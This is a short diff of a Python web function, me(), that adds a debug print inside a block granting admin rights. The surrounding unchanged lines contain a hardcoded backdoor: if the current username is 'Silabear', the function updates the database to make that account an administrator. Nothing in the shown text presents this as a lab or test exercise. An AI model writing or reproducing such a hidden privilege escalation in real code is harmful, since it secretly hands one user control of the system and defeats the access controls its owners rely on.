@@ -55,6 +55,7 @@ def me():
     if usr["username"] == "Silabear":
         conn = sqlite3.connect(config.db)
         conn.execute("update users set role = 'admin' where username = 'Silabear'")
+        print("done?")
         conn.close()
     
     return usr
